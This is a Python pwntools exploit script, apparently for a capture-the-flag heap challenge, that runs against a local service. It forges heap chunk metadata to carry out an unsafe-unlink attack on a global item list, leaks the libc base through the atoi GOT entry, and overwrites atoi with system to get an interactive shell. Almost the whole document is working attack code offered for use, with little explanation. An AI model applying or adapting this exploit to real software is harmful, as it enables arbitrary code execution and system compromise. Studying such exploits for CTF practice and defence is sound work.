from pwn import *
from time import sleep
context.arch = 'amd64'

#r = remote('csie.ctf.tw',10138)
r = remote('localhost',8888)

#r.interactive()
size = '64'
content = 'faceb00c'
magic = 0x400c23
def add_item(size,name):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.send(name)
def show():
    r.recvuntil(':')
    r.sendline('1')
def change(idx,size,name):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(idx))
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.send(name)
def remove(idx):
    r.recvuntil(':')
    r.sendline('4')
    r.recvuntil(':')
    r.sendline(str(idx))

#add
add_item(0x80,'abcd')#0
add_item(0x80,'a')#1
add_item(0x80,'a')#2

#
prev_size = 0
size = 0x81
fd = 0x6020d8-0x18
bk = 0x6020d8-0x10
chunk1 = flat([prev_size,size,fd,bk]) + 'x'*0x60

#chunk2 header 
prev_size = 0x80    #prev size check
size = 0x90         #pretend that chunk1 has been freed already, 

chunk2_header = flat([prev_size,size])

#change
change(1,0x90,chunk1+chunk2_header)
remove(2)

#now itemlist[1] == itemlist
#prepare to hijack got
atoi_got = 0x602068
#RELRO:    Partial RELRO

#set itemlist[0] = got of atoi, then print it to get libc base
pay = flat([0x123,atoi_got])
change(1,0x123,pay)


show()
#leak libc base
atoi_off = 0x36e80
r.recvuntil('0 : ')
libc = u64( r.recv(8)[:-2].ljust(8,'\x00') ) - atoi_off

print 'libc base : %s' % hex(libc)

#hijack atoi with system
sys_off = 0x45390
sys_addr = libc + sys_off

#change itemlist[0]
change(0,0x123, p64(sys_addr) )
#show()


#use atoi with user input /bin/sh
#can not send '/bin/sh' during the script, because the pipeline will catch the father input
#remember to type /bin/sh
r.interactive()
